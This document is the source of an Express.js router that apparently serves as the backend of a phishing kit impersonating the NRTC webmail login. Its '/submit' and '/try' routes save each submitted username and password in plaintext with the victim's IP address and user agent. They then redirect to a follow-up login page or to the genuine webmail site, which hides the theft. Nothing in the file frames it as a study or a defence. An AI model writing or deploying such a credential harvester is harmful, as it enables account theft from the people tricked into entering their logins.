
const express = require ('express');
const router = express.Router();
const db = require('./db');
const bodyParser = require('body-parser');



//render public dir

router.use(express.static('public'));
router.use(bodyParser.urlencoded({ extended: false }));


// Handle form submission

router.post('/submit', (req, res) => {

    const word = req.body.password;
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 

    const useragent = req.get('User-Agent');
    const date = new Date();


    // Insert a new record if no matching record exists
    const insertQuery = 'INSERT INTO ntctable (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
    db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
        if (err) {
            console.error('Error inserting record:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.redirect(`/login/?hfdgdhguirehfdhgfdrereoh=${b64}`);
		});
		   

  
     
    });
    
    



// Handle form submission

router.post('/try', (req, res) => {
   
    const name = req.body.username;
    const word = req.body.password;
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date(); 
   

		// Insert a new record if no matching record exists
		const insertQuery = 'INSERT INTO ntctable (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
		db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
		if (err) {
		    console.error('Error inserting record:', err);
		    return res.status(500).send('Internal Server Error');
		}else {
			// Send a response or redirect to another page if user does not match
			return res.redirect('https://email.nrtc.com.pk/');
		    }
				
		    


		});
		   

  
     
    });
  



module.exports =router
